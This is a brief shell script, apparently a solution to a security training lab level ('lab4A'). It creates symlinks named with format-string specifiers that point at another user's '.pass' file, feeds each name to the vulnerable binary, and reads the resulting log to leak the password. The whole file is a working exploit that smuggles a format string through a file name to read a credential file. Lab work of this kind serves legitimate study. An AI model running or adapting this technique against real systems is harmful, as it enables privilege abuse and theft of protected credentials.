#/bin/sh

for ((i=0;i<60;i++))
do
	symname="%$i\$s"
	ln -s /home/lab4end/.pass $symname

	/levels/lab04/lab4A $symname
	cat backups/.log
done
